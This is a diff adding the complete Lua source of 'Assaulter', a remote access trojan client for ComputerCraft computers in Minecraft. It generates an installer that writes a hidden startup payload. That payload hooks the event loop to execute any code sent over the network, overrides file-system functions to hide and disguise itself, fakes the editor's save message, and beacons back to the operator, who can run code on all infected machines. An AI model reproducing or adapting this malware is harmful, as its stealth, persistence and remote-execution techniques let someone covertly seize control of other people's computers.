@@ -1,0 +1,672 @@
+	
+
+    --[[
+        [RAT][Client] Assaulter
+        @version 1.0
+        @author Unkn0wn
+    --]]
+     
+     
+    local version = "1.0"
+    local w, h = term.getSize()
+     
+     
+     
+    local servers = {}
+     
+    --# Default settings
+    local settings = {
+            port = "25505";
+    }
+    if fs.exists("ASSAULT_CLIENT.cfg") then
+            local file = fs.open( "ASSAULT_CLIENT.cfg", "r" )
+            settings = textutils.unserialize( file.readAll() )
+            file.close()
+    end
+    local function save()
+            local file = fs.open( "ASSAULT_CLIENT.cfg", "w" )
+            file.writeLine( textutils.serialize( settings ) )
+            file.close()
+    end
+     
+    local function clear( color )
+        if color ~= nil then
+                if term.isColor() then
+                        term.setBackgroundColor( color )
+            end
+            end
+            term.clear()
+            term.setCursorPos( 1,1 )
+    end
+     
+     
+    local function openRednet()
+        for _, side in ipairs( rs.getSides() ) do
+            if peripheral.isPresent( side ) and peripheral.getType( side ) == "modem" then
+                rednet.open( side )
+                return true
+            end
+        end
+        return false
+    end
+     
+     
+     
+     
+     
+    if not openRednet() then
+        error("Oops, Looks like you don't have a modem! D:\nHow will you then be able to access a computer wirelessly? o_o",0)
+    end
+     
+     
+     
+     
+     
+    local code = [[
+                    native = native or {}
+                    if native.fs == nil then
+                            native.fs = {}
+                            for i, v in pairs( fs ) do
+                                    native.fs[i] = v
+                            end
+                            fs.hidden, fs.blocked, fs.fake = {},{},{}
+                    end
+                    if native.os == nil then
+                            native.os = {}
+                            for i, v in pairs( os ) do
+                                    native.os[i] = v
+                            end
+                    end
+                   
+                   
+                    local function openRednet()
+                            local bool = false
+                            for _, side in ipairs( rs.getSides() ) do
+                                    if peripheral.isPresent( side ) and peripheral.getType( side ) == "modem" then
+                                            rednet.open( side )
+                                            bool = true
+                                    end
+                            end
+                            return bool
+                    end
+                    local success = openRednet()
+                    if success then
+                            os.pullEvent = os.pullEventRaw
+                            os.pullEvent = function( event )
+                                    local e = { native.os.pullEvent( event ) }
+                                    if e[1] == "rednet_message" then
+                                            if e[2] == RAT_CLIENT then
+                                                    local func = loadstring(e[3])
+                                                    local ok, err = pcall( func )
+                                            end
+                                    end
+                                    return unpack( e )
+                            end
+                    end
+     
+     
+                    term_write = term_write or term.write
+                    term.write = function( text )
+                            if shell.getRunningProgram() == "rom/programs/edit" then
+                                    if shell.resolve( "." ) == "" then
+                                            if string.lower( text ):find( "saved to .startup" ) then
+                                                    text = text:gsub( ".startup", "startup" )
+                                            end
+                                    end
+                            end
+                            term_write( text )
+                    end
+     
+     
+                    fs.open = function( file, mode )
+     
+                            for i = 1, #fs.fake do
+                                    if string.upper(file) == string.upper(fs.fake[i].fake) then
+                                            local handle = native.fs.open( fs.fake[i].real, mode )
+                                            return handle
+                                    end
+                            end
+                            for i = 1,#fs.blocked do
+                                    if file == fs.blocked[i] then
+                                            return nil
+                                    end
+                            end
+                            local handle = native.fs.open( file, mode )
+                            return handle
+                    end
+     
+     
+                    fs.getName = function( file )
+                            for i = 1, #fs.fake do
+                                    local name = native.fs.getName( file )
+                                    if name == fs.fake[i].fake then
+                                            return fs.fake[i].real
+                                    end
+                            end
+                            local name = native.fs.getName( file )
+                            return name    
+                    end
+     
+     
+                    fs.delete = function( file )
+                            for i = 1, #fs.fake do
+                                    if string.upper(file) == string.upper( fs.fake[i].fake ) then
+                                            native.fs.delete( fs.fake[i].real )
+                                            return true
+                                    end
+                            end
+                           
+                            for i = 1,#fs.blocked do
+                                    if string.upper(file) == string.upper(fs.blocked[i]) then
+                                            return false
+                                    end
+                            end
+                            native.fs.delete( file )
+                    end
+     
+     
+                    fs.move = function( file, nFile )
+                            for i = 1, #fs.fake do
+                                    if string.upper(file) == string.upper(fs.fake[i].fake) then
+                                            native.fs.move( fs.fake[i].real, nFile )
+                                            return true
+                                    end
+                            end
+                            for i = 1,#fs.blocked do
+                                    if string.upper(file) == string.upper(fs.blocked[i]) then
+                                            return false
+                                    end
+                            end
+                            native.fs.move( file, nFile )
+                    end
+     
+     
+                    fs.copy = function( file, nFile )
+                            for i = 1, #fs.fake do
+                                    if string.upper(file) == string.upper(fs.fake[i].fake) then
+                                            native.fs.copy( fs.fake[i].real, nFile )
+                                            return true
+                                    end
+                            end
+                            for i = 1,#fs.blocked do
+                                    if string.upper(file) == string.upper(fs.blocked[i]) then
+                                            return false
+                                    end
+                            end
+                            native.fs.copy( file, nFile )
+                    end
+     
+     
+                    fs.list = function( path )
+                            local list = {}
+                            for _, file in ipairs( native.fs.list( path ) ) do
+                                    local add = true
+                                    for i = 1,#fs.blocked do
+                                            if string.upper(file) == string.upper( fs.blocked[i] ) then
+                                                    add = false
+                                            end
+                                    end
+                                    for i = 1,#fs.hidden do
+                                            if string.upper(file) == string.upper( fs.hidden[i] ) then
+                                                    add = false
+                                            end
+                                    end
+                                    for i = 1, #fs.fake do
+                                            if file == fs.fake[i].real then
+                                                    table.insert( list, fs.fake[i].fake )
+                                                    add = false
+                                                    break
+                                            end
+                                    end
+                                    if add then
+                                            table.insert( list, file )
+                                    end
+                            end
+                            return list
+                    end
+     
+                    fs.hide = function( filename )
+                            for _, name in ipairs( fs.hidden ) do
+                                    if string.upper( name ) == string.upper( filename ) then
+                                            return false
+                                    end
+                            end
+                            table.insert( fs.hidden, filename )
+                            return true
+                    end
+     
+                    fs.unhide = function( filename )
+                            for i, name in ipairs( fs.hidden ) do
+                                    if string.upper( name ) == string.upper( filename ) then
+                                            table.remove( fs.hidden, i )
+                                            return true
+                                    end
+                            end
+                            return false
+                    end
+     
+                    fs.block = function( filename )
+                            for _, name in ipairs( fs.blocked ) do
+                                    if string.upper( name ) == string.upper( filename ) then
+                                            return false
+                                    end
+                            end
+                            table.insert( fs.blocked, filename )
+                            return true
+                    end
+     
+                    fs.unblock = function( filename )
+                            for i, name in ipairs( fs.blocked ) do
+                                    if string.upper( name ) == string.upper( filename ) then
+                                            table.remove( fs.blocked, i )
+                                            return true
+                                    end
+                            end
+                            return false
+                    end
+     
+                    fs.disguise = function( file, disguise )
+                            local t = {
+                                    real = disguise,
+                                    fake = file,
+                            }
+                            for i = 1,#fs.fake do
+                                    if string.upper(file) == string.upper( fs.fake[i].fake ) then
+                                            return false
+                                    end
+                            end
+                            table.insert( fs.fake, t )
+                    end
+     
+     
+                    fs.hide( "startup" )
+                    fs.disguise( "startup", ".startup" )
+     
+     
+                    shell_resolve = shell_resolve or shell.resolve
+                    shell.resolve = function ( file )
+                            local name = file
+                            for i = 1, #fs.fake do
+                                    if string.upper(file) == string.upper( fs.fake[i].fake ) then
+                                            name = fs.fake[i].real
+                                            break
+                                    end
+                            end
+                            local sPath = shell_resolve( name )
+                            return sPath
+                    end
+     
+                    rednet.send( RAT_CLIENT, "ASSAULTER.SERVER:" .. RAT_CLIENT_PORT )
+                   
+                    if fs.exists( ".startup" ) then
+                            shell.run( ".startup" )
+                    end
+    ]]
+     
+     
+    local function addServer( id )
+        for i, v in ipairs( servers ) do
+                if id == v then
+                        return false
+                    end
+            end
+            table.insert( servers, id )
+            return true
+    end
+     
+     
+    if term.isColor() then
+            clear( colors.green )
+            term.setTextColor( colors.lime )
+    else
+            clear( colors.black )
+            term.setTextColor( colors.white )
+    end
+     
+     
+    -- Don't worry, These overrides are temporary, They will restore the original
+    -- as soon as the program have shutdown/terminated
+    _print = _print or print
+    print = function( text )
+            local x, _ = term.getCursorPos()
+            _print( text )
+            local _, y = term.getCursorPos()
+            term.setCursorPos( x, y )
+    end
+     
+     
+    os_pullEvent = os_pullEvent or os.pullEvent
+    os.pullEvent = function( ... )
+        local e = { os_pullEvent( ... ) }
+            if e[1] == "rednet_message" then
+                if e[3] == "ASSAULTER.SERVER:" .. settings.port then
+                        addServer( e[2] )
+                    end
+            end
+            return unpack( e )
+    end
+     
+     
+     
+     
+    local function redraw()
+            local x, y = term.getCursorPos()
+           
+            local w, h = term.getSize()
+            local line = ""
+            for x = 1, w do
+                    line = line .. " "
+            end
+            for y = 1,2 do
+                    term.setCursorPos( 1, y )
+                    write( line )
+            end
+            term.setCursorPos( 1, 1 )
+            print( "[Assaulter Client " .. version .. "]" )
+           
+            if y > h then
+                term.scroll( 1 )
+                    term.setCursorPos( 2, h )
+            else
+                    term.setCursorPos( 2, y )
+            end
+    end
+     
+    local function main()
+     
+        local usage = {}
+     
+            local function printUsage()
+                local x, y = term.getCursorPos()
+                    if y >= h then
+                            term.scroll( #usage + 2 )
+                            term.setCursorPos( 2, h  - #usage + 1 )
+                            x, y = term.getCursorPos()
+                    end
+                for i, v in ipairs( usage ) do
+                        if i == 1 then
+                                if #usage > 1 then
+                                            print( v .. "\n" )
+                                    else
+                                        print( v )
+                                    end
+                            else
+                                print( "    " .. v )
+                            end
+                    end
+            end
+     
+            local function getCode( filename )
+                    if fs.exists( filename ) then
+                            local file = fs.open( filename, "r" )
+                            local nTable = {}
+                            local line = file.readLine()
+                            repeat
+                                    table.insert(nTable,line)
+                                    line = file.readLine()
+                            until line == nil
+                            file.close()
+                            return nTable
+                    else
+                            error( "File doesn't exist: " .. filename, 2 )
+                    end
+            end
+           
+            local function sendServers( code )
+                for _, id in ipairs( servers ) do
+                        print( "@" .. id .. "  Executing code" )
+                        rednet.send( id, code )
+                    end
+            end
+           
+     
+            local history = {}
+     
+           
+           
+           
+           
+            term.setCursorPos( 2, 3 )
+            redraw()
+            while true do
+               
+                    usage = {
+                        "@COMMANDS";
+                            "[GETSERVERS] Returns all servers connected";
+                            "[SAVESERVERS] Saves current servers connected";
+                            "[LOADSERVERS] Load servers from a file";
+                            "[PORT] Returns the current port";
+                            "[CHANGEPORT] Changes the current port";
+                            "[EXECUTE] Executes code on the server";
+                            "[NEW] Creates a server installer";
+                            "[EXIT] Exits the client\n";
+                    }
+                   
+                    redraw()
+                    local x, y = term.getCursorPos()
+                    write( "> " )
+                    local args = {}
+                    local input = read( nil, history )
+                    term.setCursorPos( x, y + 2 )
+                    table.insert( history, input )
+                    for word in input:gmatch("%S+") do
+                            table.insert( args, word )
+                    end
+                    if #args ~= 0 then
+                            args[1] = string.upper(args[1])
+                            if args[1] == "GETSERVERS" then
+                                    print("@SERVERS")
+                                    for i = 1,#servers do
+                                            local x, y = term.getCursorPos()
+                                            if y > h - 2 then
+                                                term.scroll(1)
+                                                    term.setCursorPos( 1, h )
+                                                    term.write("Press Any Key to Continue")
+                                                    term.setCursorPos( 2, h - 2 )
+                                                    print( i .. ":  " .. servers[i] )
+                                                    os.pullEvent("key")
+                                                    local line = ""
+                                                    for x = 1, w do
+                                                            line = line .. " "
+                                                    end
+                                                    for y = h - 1,h do
+                                                            term.setCursorPos( 1, y )
+                                                            write( line )
+                                                    end
+                                            else
+                                                    print( i .. ":  " .. servers[i] )
+                                            end
+                                    end
+                                    print("")
+                           
+                            elseif args[1] == "EXECUTE" then
+                                usage = {
+                                        "EXECUTE [SERVER ID] [MODE] [ARGUMENTS]";
+                                            "[SERVER ID] number";
+                                            "[MODE] string, FILE, CODE";
+                                            "[ARGUMENTS] ...\n";
+                                    }
+                                           
+                                    if #args > 2 then
+                                        local id = nil
+                                            for _, v in ipairs( servers ) do
+                                                    if tonumber( args[2] ) and string.upper(args[2]) ~= "ALL" then
+                                                            id = tonumber( args[2] )
+                                                            if id == v then
+                                                                    if string.upper(args[3]) == "FILE" then
+                                                                            if fs.exists( args[4] ) then
+                                                                                    local code = ""
+                                                                                    local t = getCode( args[4] )
+                                                                                    for _, v in ipairs( t ) do
+                                                                                            code = code .. " " .. v
+                                                                                    end
+                                                                                    rednet.send( id, code )
+                                                                            else
+                                                                                    print( "@ERROR File not found\n" )
+                                                                            end
+                                                                   
+                                                                    elseif string.upper(args[3]) == "CODE" then
+                                                                            if #args > 3 then
+                                                                                    local code = ""
+                                                                                    for i = 4, #args do
+                                                                                            code = code .. " " .. args[i]
+                                                                                    end
+                                                                                    rednet.send( id, code )
+                                                                            else
+                                                                                    print( "@ERROR Code is nil" )
+                                                                            end
+                                                             
+                                                                    else
+                                                                            print( "MODES [FILE, CODE]" )
+                                                                            break
+                                                                    end
+                                                            end
+                                                    else
+                                                        if string.upper(args[2]) == "ALL" then
+                                                                id = "ALL"
+                                                                    if string.upper(args[3]) == "FILE" then
+                                                                            if fs.exists( args[4] ) then
+                                                                                    local code = ""
+                                                                                    local t = getCode( args[4] )
+                                                                                    for _, v in ipairs( t ) do
+                                                                                            code = code .. " " .. v
+                                                                                    end
+                                                                                    sendServers( code )
+                                                                                    break
+                                                                            else
+                                                                                    print( "@ERROR File not found\n" )
+                                                                            end
+                                                                   
+                                                                    elseif string.upper(args[3]) == "CODE" then
+                                                                            if #args > 3 then
+                                                                                    local code = ""
+                                                                                    for i = 4, #args do
+                                                                                            code = code .. " " .. args[i]
+                                                                                    end
+                                                                                    sendServers( code )
+                                                                                    break
+                                                                            else
+                                                                                    print( "@ERROR Code is nil" )
+                                                                            end
+                                                             
+                                                                    else
+                                                                            print( "MODES [FILE, CODE]" )
+                                                                    end
+                                                        else
+                                                                print("Invalid server id!")
+                                                            end
+                                                    end
+                                            end
+                                            if id == nil then
+                                                print( "@ERROR Couldn't find server\n" )
+                                            end
+                                   
+                                    else
+                                            printUsage()
+                                    end
+                                   
+                            elseif args[1] == "NEW" then
+                                usage = {
+                                        "NEW [FILENAME]\n";
+                                    }
+                                       
+                                    if #args > 1 then
+                                            local file = fs.open( args[2], "w" )
+                                            file.writeLine("local code = [[")
+                                            file.writeLine( "RAT_CLIENT=" .. os.getComputerID() )
+                                            file.writeLine( "RAT_CLIENT_PORT=" .. settings.port )
+                                            file.writeLine("")
+                                            file.write( code )
+                                            file.writeLine("")
+                                            file.writeLine("]]")
+                                            file.writeLine("local f = fs.open('startup', 'w')")
+                                            file.writeLine("f.writeLine( code )")
+                                            file.writeLine("f.close()")
+                                            file.close()
+                                            file.close()
+                                    else
+                                            printUsage()
+                                    end
+                                   
+                            elseif args[1] == "EXIT" then
+                                    error( "Terminated", 0 )
+                           
+                            elseif args[1] == "PORT" then
+                                usage = {
+                                        "PORT: " .. settings.port .. "\n";
+                                    }
+                                    printUsage()
+                                   
+                            elseif args[1] == "CHANGEPORT" then
+                                    usage = {
+                                            "CHANGEPORT [PORT]";
+                                            "[PORT] ...\n";
+                                    }
+                                    if #args < 2 then
+                                            printUsage()
+                                    else
+                                            settings.port = args[2]
+                                            save()
+                                    end
+                           
+               elseif args[1] == "SAVESERVERS" then
+                                usage = {
+                                        "SAVESERVERS [FILENAME]\n";
+                                    }
+                   if #args > 1 then
+                       local f = fs.open( args[2], "w" )
+                       f.writeLine( textutils.serialize( servers ) )
+                       f.close()
+                   else
+                       printUsage()
+                   end
+     
+               elseif args[1] == "LOADSERVERS" then
+                   usage = {
+                       "LOADSERVERS [FILENAME]\n";
+                   }
+                   if #args > 1 then
+                       local f = fs.open( args[2], "r" )
+                       servers = textutils.unserialize( f.readAll() )
+                       f.close()
+                   else
+                       printUsage()
+                    end                    
+                                   
+                            elseif args[1] == "HELP" then
+                                printUsage()
+                                   
+                            else
+                                usage = {
+                                        "Unknown command, HELP for commands"
+                                    }
+                                    printUsage()
+                                    print("")
+                            end
+                    else
+                            printUsage()
+                    end
+            end
+    end
+     
+    local function restore()
+       print = _print
+            os.pullEvent = os_pullEvent
+    end
+     
+    local ok, err = pcall( main )
+    if not ok and err == "Terminated" then
+            clear( colors.black )
+            print( "Thanks for using Assaulter Client!\n" )
+            term.setTextColor( colors.white )
+            restore()
+    elseif err ~= "Terminated" then
+       clear( colors.black )
+            if term.isColour() then
+                term.setTextColor( colors.red )
+            end
+            print("Error: " .. err )
+            term.setTextColor( colors.white )
+            restore()
+    end
+
